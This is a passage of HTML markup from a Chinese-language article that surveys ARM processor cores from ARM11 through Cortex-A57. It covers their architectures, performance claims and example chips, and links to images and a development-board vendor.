style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana">ARM </span><span style="font-family:宋体">处理器架构发展</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A57</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">A53</span><span style="font-family:宋体">处理器</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A53</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">Cortex-A57</span><span style="font-family:宋体">两款处理器属于</span><span style="font-family:Verdana">Cortex-A50</span><span style="font-family:宋体">系列，首次采用</span><span style="font-family:Verdana">64</span><span style="font-family:宋体">位</span><span style="font-family:Verdana">ARMv8</span><span style="font-family:宋体">架构，意义重大，这也是</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">最近刚刚发布的两款产品。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM73.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体; background-color:white">　　</span><span style="font-family:Verdana; background-color:white"> Cortex-A57</span><span style="font-family:宋体; background-color:white">是</span><span style="font-family:Verdana; background-color:white">ARM</span><span style="font-family:宋体; background-color:white">最先进、性能最高的应用处理器，号称可在同样的功耗水平下达到当今顶级智能手机性能的三倍；而</span><span style="font-family:Verdana; background-color:white">Cortex-A53</span><span style="font-family:宋体; background-color:white">是世界上能效最高、面积最小的</span><span style="font-family:Verdana; background-color:white">64</span><span style="font-family:宋体; background-color:white">位处理器，同等性能下能效是当今高端智能手机的三倍。这两款处理器还可整合为</span><span style="font-family:Verdana; background-color:white">ARM big.LITTLE</span><span style="font-family:宋体; background-color:white">（大小核心伴侣）处理器架构，根据运算需求在两者间进行切换，以结合高性能与高功耗效率的特点，两个处理器是独立运作的。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM74.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM75.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> </span><span style="font-family:宋体">应用案例：预计于</span><span style="font-family:Verdana">2014</span><span style="font-family:宋体">年推出。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A15</span><span style="font-family:宋体">处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM Cortex-A15</span><span style="font-family:宋体">处理器隶属于</span><span style="font-family:Verdana">Cortex-A</span><span style="font-family:宋体">系列，基于</span><span style="font-family:Verdana">ARMv7-A</span><span style="font-family:宋体">架构，是业界迄今为止性能最高且可授予许可的处理器。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM76.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A15 MPCore</span><span style="font-family:宋体">处理器具有无序超标量管道，带有紧密耦合的低延迟</span><span style="font-family:Verdana">2</span><span style="font-family:宋体">级高速缓存，该高速缓存的大小最高可达</span><span style="font-family:Verdana">4MB</span><span style="font-family:宋体">。浮点和</span><span style="font-family:Verdana">NEON</span><span style="font-family:宋体">媒体性能方面的其他改进使设备能够为消费者提供下一代用户体验，并为</span><span style="font-family:Verdana"> Web </span><span style="font-family:宋体">基础结构应用提供高性能计算。</span><span style="font-family:Verdana">Cortex-A15</span><span style="font-family:宋体">处理器可以应用在智能手机、平板电脑、移动计算、高端数字家电、服务器和无线基础结构等设备上。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM77.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体; background-color:white">　　</span><span style="font-family:Verdana; background-color:white"><br>            </span><span style="font-family:宋体; background-color:white">理论上，</span><span style="font-family:Verdana; background-color:white">Cortex-A15 MPCore</span><span style="font-family:宋体; background-color:white">处理器的移动配置所能提供的性能是当前的高级智能手机性能的五倍还多。在高级基础结构应用中，</span><span style="font-family:Verdana; background-color:white">Cortex-A15 </span><span style="font-family:宋体; background-color:white">的运行速度最高可达</span><span style="font-family:Verdana; background-color:white">2.5GHz</span><span style="font-family:宋体; background-color:white">，这将支持在不断降低功耗、散热和成本预算方面实现高度可伸缩的解决方案。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"><br>            </span><span style="font-family:宋体">应用案例：三星</span><span style="font-family:Verdana">Exynos 5250</span><span style="font-family:宋体">。三星</span><span style="font-family:Verdana">Exynos 5250</span><span style="font-family:宋体">芯片是首款</span><span style="font-family:Verdana">A15</span><span style="font-family:宋体">芯片，应用在了最近发布的</span><span style="font-family:Verdana">Chromebook</span><span style="font-family:宋体">和</span><span style="font-family:Verdana">Nexus 10</span><span style="font-family:宋体">平板电脑上面。</span><span style="font-family:Verdana">Exynos 5250</span><span style="font-family:宋体">的频率是</span><span style="font-family:Verdana">1.7GHz</span><span style="font-family:宋体">，采用</span><span style="font-family:Verdana">32</span><span style="font-family:宋体">纳米的</span><span style="font-family:Verdana">HKMG</span><span style="font-family:宋体">工艺，配备了</span><span style="font-family:Verdana">Mali-604 GPU</span><span style="font-family:宋体">，性能强大。另外据传三星下一代</span><span style="font-family:Verdana">Galaxy S4</span><span style="font-family:宋体">将会搭载四核版的</span><span style="font-family:Verdana">Exynos 5450</span><span style="font-family:宋体">芯片组，同样应用</span><span style="font-family:Verdana">Cortex-A15</span><span style="font-family:宋体">内核。另外</span><span style="font-family:Verdana">NVIDIA Tegra 4</span><span style="font-family:宋体">会采用</span><span style="font-family:Verdana">A15</span><span style="font-family:宋体">内核。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A12</span><span style="font-family:宋体">处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana">2013</span><span style="font-family:宋体">中旬，</span><span style="font-family:Verdana">ARM </span><span style="font-family:宋体">发布了全新的</span><span style="font-family:Verdana">Cortex-A12</span><span style="font-family:宋体">处理器，在相同功耗下，</span><span style="font-family:Verdana">Cortex-A12</span><span style="font-family:宋体">的性能上比</span><span style="font-family:Verdana">Cortex-A9</span><span style="font-family:宋体">提升了</span><span style="font-family:Verdana">40%</span><span style="font-family:宋体">，同时尺寸上也同样减小了</span><span style="font-family:Verdana">30%</span><span style="font-family:宋体">。</span><span style="font-family:Verdana">Cortex-A12</span><span style="font-family:宋体">也同样能够支持</span><span style="font-family:Verdana">big.LITTLE</span><span style="font-family:宋体">技术，可以搭配</span><span style="font-family:Verdana">Cortex-A7</span><span style="font-family:宋体">处理器进一步提升处理器的效能。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM78.png" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana">Cortex-A12</span><span style="font-family:宋体">架构图</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana; background-color:white">ARM</span><span style="font-family:宋体; background-color:white">表示</span><span style="font-family:Verdana; background-color:white">Cortex-A12</span><span style="font-family:宋体; background-color:white">处理器未来将应用于大量的智能手机以及平板产品，但更加侧重于中端产品。同时</span><span style="font-family:Verdana; background-color:white">ARM</span><span style="font-family:宋体; background-color:white">也预计在</span><span style="font-family:Verdana; background-color:white">2015</span><span style="font-family:宋体; background-color:white">年，这些中端产品在数量上将远超过旗舰级别的智能手机及与平板。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM79.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana"><br></span><span style="font-family:宋体; background-color:white">搭载</span><span style="font-family:Verdana; background-color:white">Cortex-A12</span><span style="font-family:宋体; background-color:white">处理器的中端机在未来也将是非常有特点的产品，因为</span><span style="font-family:Verdana; background-color:white">Cortex-A12</span><span style="font-family:宋体; background-color:white">能够支持虚拟化、</span><span style="font-family:Verdana; background-color:white">AMD TrustZone</span><span style="font-family:宋体; background-color:white">技术，以及最大</span><span style="font-family:Verdana; background-color:white">1TB</span><span style="font-family:宋体; background-color:white">的机身存储。这也就意味着未来搭载这一处理器的智能手机完全可以作为所谓的</span><span style="font-family:Verdana; background-color:white">BYOD</span><span style="font-family:宋体; background-color:white">（</span><span style="font-family:Verdana; background-color:white">Bring Your Own Device</span><span style="font-family:宋体; background-color:white">）设备使用，换句话说就是在作为自用手机的同时，还可以用作商务手机存储商务内容。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM710.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana">Mali-V500</span><span style="font-family:宋体">架构图</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体; background-color:white">同时</span><span style="font-family:Verdana; background-color:white">Cortex-A12</span><span style="font-family:宋体; background-color:white">也搭载了全新的</span><span style="font-family:Verdana; background-color:white">Mali-T622</span><span style="font-family:宋体; background-color:white">绘图芯片与</span><span style="font-family:Verdana; background-color:white">Mali-V500</span><span style="font-family:宋体; background-color:white">视频编解码</span><span style="font-family:Verdana; background-color:white">IP</span><span style="font-family:宋体; background-color:white">解决方案，同样也是以节能为目标。这样看来，定位中端市场，低功耗小尺寸，</span><span style="font-family:Verdana; background-color:white">Cortex-A12</span><span style="font-family:宋体; background-color:white">最终必然会取代</span><span style="font-family:Verdana; background-color:white">Cortex-A9</span><span style="font-family:宋体; background-color:white">。据悉，</span><span style="font-family:Verdana; background-color:white">Cortex-A12</span><span style="font-family:宋体; background-color:white">将于</span><span style="font-family:Verdana; background-color:white">2014</span><span style="font-family:宋体; background-color:white">年投放市场，到时候我们也许会迎来中端市场的一次改变。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">应用案例：</span><span style="font-family:Verdana">2014</span><span style="font-family:宋体">年发布。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A9</span><span style="font-family:宋体">处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM Cortex-A9</span><span style="font-family:宋体">处理器隶属于</span><span style="font-family:Verdana">Cortex-A</span><span style="font-family:宋体">系列，基于</span><span style="font-family:Verdana">ARMv7-A</span><span style="font-family:宋体">架构，目前我们能见到的四核处理器大多都是属于</span><span style="font-family:Verdana">Cortex-A9</span><span style="font-family:宋体">系列。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM711.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A9 </span><span style="font-family:宋体">处理器的设计旨在打造最先进的、高效率的、长度动态可变的、多指令执行超标量体系结构，提供采用乱序猜测方式执行的</span><span style="font-family:Verdana"> 8 </span><span style="font-family:宋体">阶段管道处理器，凭借范围广泛的消费类、网络、企业和移动应用中的前沿产品所需的功能，它可以提供史无前例的高性能和高能效。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM712.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A9 </span><span style="font-family:宋体">微体系结构既可用于可伸缩的多核处理器（</span><span style="font-family:Verdana">Cortex-A9 MPCore</span><span style="font-family:宋体">多核处理器），也可用于更传统的处理器（</span><span style="font-family:Verdana">Cortex-A9</span><span style="font-family:宋体">单核处理器）。可伸缩的多核处理器和单核处理器支持</span><span style="font-family:Verdana"> 16</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">32 </span><span style="font-family:宋体">或</span><span style="font-family:Verdana"> 64KB 4 </span><span style="font-family:宋体">路关联的</span><span style="font-family:Verdana"> L1 </span><span style="font-family:宋体">高速缓存配置，对于可选的</span><span style="font-family:Verdana"> L2 </span><span style="font-family:宋体">高速缓存控制器，最多支持</span><span style="font-family:Verdana"> 8MB </span><span style="font-family:宋体">的</span><span style="font-family:Verdana"> L2 </span><span style="font-family:宋体">高速缓存配置，它们具有极高的灵活性，均适用于特定应用领域和市场。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM713.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> </span><span style="font-family:宋体">应用案例：德州仪器</span><span style="font-family:Verdana">OMAP 4430/4460</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">Tegra 2</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">Tegra 3</span><span style="font-family:宋体">、新岸线</span><span style="font-family:Verdana">NS115</span><span style="font-family:宋体">、瑞芯微</span><span style="font-family:Verdana">RK3066</span><span style="font-family:宋体">、联发科</span><span style="font-family:Verdana">MT6577</span><span style="font-family:宋体">、三星</span><span style="font-family:Verdana"> Exynos 4210</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">4412</span><span style="font-family:宋体">、华为</span><span style="font-family:Verdana">K3V2</span><span style="font-family:宋体">等。另外高通</span><span style="font-family:Verdana">APQ8064</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">MSM8960</span><span style="font-family:宋体">、苹果</span><span style="font-family:Verdana">A6</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">A6X</span><span style="font-family:宋体">等都可以看做是在</span><span style="font-family:Verdana">A9</span><span style="font-family:宋体">架构基础上的改良版本。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A8</span><span style="font-family:宋体">处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM Cortex-A8</span><span style="font-family:宋体">处理器隶属于</span><span style="font-family:Verdana">Cortex-A</span><span style="font-family:宋体">系列，基于</span><span style="font-family:Verdana">ARMv7-A</span><span style="font-family:宋体">架构，是我们目前使用的单核手机中最为常见的产品。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM714.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM Cortex-A8</span><span style="font-family:宋体">处理器是首款基于</span><span style="font-family:Verdana">ARMv7</span><span style="font-family:宋体">体系结构的产品，能够将速度从</span><span style="font-family:Verdana">600MHz</span><span style="font-family:宋体">提高到</span><span style="font-family:Verdana">1GHz</span><span style="font-family:宋体">以上。</span><span style="font-family:Verdana">Cortex-A8</span><span style="font-family:宋体">处理器可以满足需要在</span><span style="font-family:Verdana">300mW</span><span style="font-family:宋体">以下运行的移动设备的功率优化要求；以及需要</span><span style="font-family:Verdana">2000 Dhrystone MIPS</span><span style="font-family:宋体">的消费类应用领域的性能优化要求。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM715.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A8 </span><span style="font-family:宋体">高性能处理器目前已经非常成熟，从高端特色手机到上网本、</span><span style="font-family:Verdana">DTV</span><span style="font-family:宋体">、打印机和汽车信息娱乐，</span><span style="font-family:Verdana">Cortex-A8</span><span style="font-family:宋体">处理器都提供了可靠的高性能解决方案。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> </span><span style="font-family:宋体">应用案例：[</span><span style="color:#0f758e"><span style="font-family:Verdana; text-decoration:underline">MYS-S5PV210</span><span style="font-family:宋体"><span style="text-decoration:underline">开发板</span><span style="color:black">、</span></span><span style="font-family:Verdana">TI OMAP3</span><span style="color:black"><span style="font-family:宋体">系列、苹果</span><span style="font-family:Verdana">A4</span><span style="font-family:宋体">处理器（</span><span style="font-family:Verdana">iPhone 4</span><span style="font-family:宋体">）、三星</span><span style="font-family:Verdana">S5PC110</span><span style="font-family:宋体">（三星</span><span style="font-family:Verdana">I9000</span><span style="font-family:宋体">）、瑞芯微</span><span style="font-family:Verdana">RK2918</span><span style="font-family:宋体">、联发科</span><span style="font-family:Verdana">MT6575</span><span style="font-family:宋体">等。另外，高通的</span><span style="font-family:Verdana">MSM8255</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">MSM7230</span><span style="font-family:宋体">等也可看做是</span><span style="font-family:Verdana">A8</span><span style="font-family:宋体">的衍生版本。</span><span style="font-family:Verdana"><br>                    </span></span></span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A7</span><span style="font-family:宋体">处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM Cortex-A7</span><span style="font-family:宋体">处理器隶属于</span><span style="font-family:Verdana">Cortex-A</span><span style="font-family:宋体">系列，基于</span><span style="font-family:Verdana">ARMv7-A</span><span style="font-family:宋体">架构，它的特点是在保证性能的基础上提供了出色的低功耗表现。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM716.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A7</span><span style="font-family:宋体">处理器的体系结构和功能集与</span><span style="font-family:Verdana">Cortex-A15 </span><span style="font-family:宋体">处理器完全相同，不同这处在于，</span><span style="font-family:Verdana">Cortex-A7 </span><span style="font-family:宋体">处理器的微体系结构侧重于提供最佳能效，因此这两种处理器可在</span><span style="font-family:Verdana">big.LITTLE</span><span style="font-family:宋体">（大小核大小核心伴侣结构）配置中协同工作，从而提供高性能与超低功耗的终极组合。单个</span><span style="font-family:Verdana">Cortex-A7</span><span style="font-family:宋体">处理器的能源效率是</span><span style="font-family:Verdana">ARM Cortex-A8</span><span style="font-family:宋体">处理器的</span><span style="font-family:Verdana">5</span><span style="font-family:宋体">倍，性能提升</span><span style="font-family:Verdana">50%</span><span style="font-family:宋体">，而尺寸仅为后者的五分之一。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM717.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"><br>            </span><span style="font-family:宋体">作为独立处理器，</span><span style="font-family:Verdana">Cortex-A7</span><span style="font-family:宋体">可以使</span><span style="font-family:Verdana">2013-2014</span><span style="font-family:宋体">年期间低于</span><span style="font-family:Verdana">100</span><span style="font-family:宋体">美元价格点的入门级智能手机与</span><span style="font-family:Verdana">2010 </span><span style="font-family:宋体">年</span><span style="font-family:Verdana">500</span><span style="font-family:宋体">美元的高端智能手机相媲美。这些入门级智能手机在发展中世界将重新定义连接和</span><span style="font-family:Verdana">Internet</span><span style="font-family:宋体">使用。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM718.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> </span><span style="font-family:宋体">应用案例：全志</span><span style="font-family:Verdana">Cortex-A7</span><span style="font-family:宋体">四核平板芯片，联发科刚刚发布的</span><span style="font-family:Verdana">MT6589</span><span style="font-family:宋体">。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● Cortex-A5</span><span style="font-family:宋体">处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体; background-color:white">　　</span><span style="font-family:Verdana; background-color:white"> ARM Cortex-A5</span><span style="font-family:宋体; background-color:white">处理器隶属于</span><span style="font-family:Verdana; background-color:white">Cortex-A</span><span style="font-family:宋体; background-color:white">系列，基于</span><span style="font-family:Verdana; background-color:white">ARMv7-A</span><span style="font-family:宋体; background-color:white">架构，它是能效最高、成本最低的处理器。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM719.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> Cortex-A5</span><span style="font-family:宋体">处理器可为现有</span><span style="font-family:Verdana">ARM9</span><span style="font-family:宋体">和</span><span style="font-family:Verdana">ARM11</span><span style="font-family:宋体">处理器设计提供很有价值的迁移途径，它可以获得比</span><span style="font-family:Verdana">ARM1176JZ-S</span><span style="font-family:宋体">更好的性能，比</span><span style="font-family:Verdana">ARM926EJ-S</span><span style="font-family:宋体">更好的功效和能效。另外，</span><span style="font-family:Verdana">Cortex-A5</span><span style="font-family:宋体">处理器不仅在指令以及功能方面与更高性能的</span><span style="font-family:Verdana">Cortex-A8</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">Cortex-A9</span><span style="font-family:宋体">和</span><span style="font-family:Verdana">Cortex-A15</span><span style="font-family:宋体">处理器完全兼容，同时还保持与经典</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">处理器（包括</span><span style="font-family:Verdana">ARM926EJ-S</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">ARM1176JZ-S</span><span style="font-family:宋体">和</span><span style="font-family:Verdana"> ARM7TDMI</span><span style="font-family:宋体">）的向后应用程序兼容性。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM720.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> </span><span style="font-family:宋体">应用案例：高通</span><span style="font-family:Verdana">MSM7227A/7627A</span><span style="font-family:宋体">（新渴望</span><span style="font-family:Verdana">V</span><span style="font-family:宋体">、摩托罗拉</span><span style="font-family:Verdana">XT615</span><span style="font-family:宋体">、诺基亚</span><span style="font-family:Verdana">610</span><span style="font-family:宋体">、中兴</span><span style="font-family:Verdana">V889D</span><span style="font-family:宋体">、摩托罗拉</span><span style="font-family:Verdana">DEFY XT</span><span style="font-family:宋体">等）、高通</span><span style="font-family:Verdana">MSM8225/8625</span><span style="font-family:宋体">（小辣椒双核版、华为</span><span style="font-family:Verdana">U8825D</span><span style="font-family:宋体">、天语</span><span style="font-family:Verdana"> W806+</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">innos D9</span><span style="font-family:宋体">、酷派</span><span style="font-family:Verdana">7266</span><span style="font-family:宋体">等）、米尔</span><span style="font-family:Verdana"> <a href="http://www.myir-tech.com/product/myd-sama5d3x.htm" target="_blank"><span style="color:#0f758e; text-decoration:underline">MYD-SAMA5D3X</span>](http://www.myir-tech.com/product/mys-s5pv210.htm)</a></span><span style="font-family:宋体"><span style="text-decoration:underline">系列开发板</span>（</span><span style="font-family:Verdana">MYD-SAMA5D31</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">MYD-SAMA5D33</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">MYD-SAMA5D34</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">MYD-SAMA5D35</span><span style="font-family:宋体">）。</span><span style="font-family:Verdana"><br>            </span></span></p><p><a href="http://www.myir-tech.com/product/myd-sama5d3x.htm" target="_blank" rel="external"><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM721.jpg" alt=""></a><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><a href="http://www.myir-tech.com/product/myd-sama5d3x.htm" target="_blank" rel="external"><span style="color:#0f758e; font-size:9pt; text-decoration:underline"><span style="font-family:Verdana">MYD-SAMA5D3X</span><span style="font-family:宋体">开发板</span></span></a><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● ARM11</span><span style="font-family:宋体">系列处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM11</span><span style="font-family:宋体">系列包括了</span><span style="font-family:Verdana">ARM11MPCore</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">ARM1176</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">ARM1156</span><span style="font-family:宋体">处理器、</span><span style="font-family:Verdana">ARM1136</span><span style="font-family:宋体">处理器，它们是基于</span><span style="font-family:Verdana">ARMv6</span><span style="font-family:宋体">架构，分别针对不同应用领域。</span><span style="font-family:Verdana">ARM1156</span><span style="font-family:宋体">处理器主要应用在高可靠性和实时嵌入式应用领域，与手机关联不大，此处略去介绍。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM722.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM11 MPCore</span><span style="font-family:宋体">使用多核处理器结构，可实现从</span><span style="font-family:Verdana">1</span><span style="font-family:宋体">个内核到</span><span style="font-family:Verdana">4</span><span style="font-family:宋体">个内核的多核可扩展性，从而使具有单个宏的简单系统设计可以集成高达单个内核的</span><span style="font-family:Verdana">4</span><span style="font-family:宋体">倍的性能。</span><span style="font-family:Verdana">Cortex-A5</span><span style="font-family:宋体">处理器是</span><span style="font-family:Verdana">ARM11MPCore</span><span style="font-family:宋体">的相关后续产品。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体; background-color:white">　　</span><span style="font-family:Verdana; background-color:white"> ARM1176</span><span style="font-family:宋体; background-color:white">处理器主要应用在智能手机、数字电视和电子阅读器中，在这些领域得到广泛部署，它可提供媒体和浏览器功能、安全计算环境，在低成本设计的情况下性能高达</span><span style="font-family:Verdana; background-color:white">1GHz</span><span style="font-family:宋体; background-color:white">。</span></span><span style="font-family:宋体; font-size:12pt"><br>        </span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM723.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM1136</span><span style="font-family:宋体">处理器包含带媒体扩展的</span><span style="font-family:Verdana">ARMv6 </span><span style="font-family:宋体">指令集、</span><span style="font-family:Verdana">Thumb</span><span style="font-family:宋体">代码压缩技术以及可选的浮点协处理器。</span><span style="font-family:Verdana">ARM1136</span><span style="font-family:宋体">是一个成熟的内核，作为一种应用处理器广泛部署在手机和消费类应用场合中。在采用</span><span style="font-family:Verdana"> 90G</span><span style="font-family:宋体">工艺时性能可达到</span><span style="font-family:Verdana">600MHz</span><span style="font-family:宋体">以上，在面积为</span><span style="font-family:Verdana">2</span><span style="font-family:宋体">平方毫米且采用</span><span style="font-family:Verdana">65</span><span style="font-family:宋体">纳米工艺时可达到</span><span style="font-family:Verdana">1GHz</span><span style="font-family:宋体">。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM724.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"><br>            